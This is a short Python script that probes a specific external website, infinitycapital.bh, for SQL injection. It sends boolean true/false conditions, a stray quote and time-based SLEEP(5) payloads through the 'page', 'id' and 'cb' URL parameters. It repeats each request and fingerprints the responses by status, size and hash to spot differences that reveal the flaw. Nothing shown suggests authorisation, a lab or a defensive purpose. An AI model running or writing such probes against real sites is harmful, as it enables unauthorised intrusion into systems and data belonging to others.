import requests, urllib.parse, time, hashlib
B="https://www.infinitycapital.bh"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
H={"User-Agent":UA,"Accept":"text/html,application/xhtml+xml,*/*;q=0.8"}
def stable(url,tries=8,pause=1.5):
    res={}
    for _ in range(tries):
        try:
            r=requests.get(url,headers=H,timeout=25,allow_redirects=False)
            k=(r.status_code,len(r.content),hashlib.md5(r.content).hexdigest()[:8])
        except Exception as e: k=("ERR",0,"")
        res[k]=res.get(k,0)+1
        time.sleep(pause)
    return res
tests=[
 ("T1_page_true","/?page=2"),
 ("T2_page_false","/?page=2%20AND%201=2"),
 ("T3_page_quote","/?page=2'"),
 ("T4_page_num3","/?page=3"),
 ("T5_page_999","/?page=999"),
 ("T6_page_sleep","/?page=2%20AND%20SLEEP(5)"),
 ("T7_id_true","/api?id=1"),
 ("T8_id_false","/api?id=1%20AND%201=2"),
 ("T9_cb_true","/contact?cb=1"),
 ("T10_cb_false","/contact?cb=1%20AND%201=2"),
 ("T11_cb_sleep","/contact?cb=1%20AND%20SLEEP(5)"),
]
for n,u in tests:
    print(n,u)
    print("   ",stable(B+u))
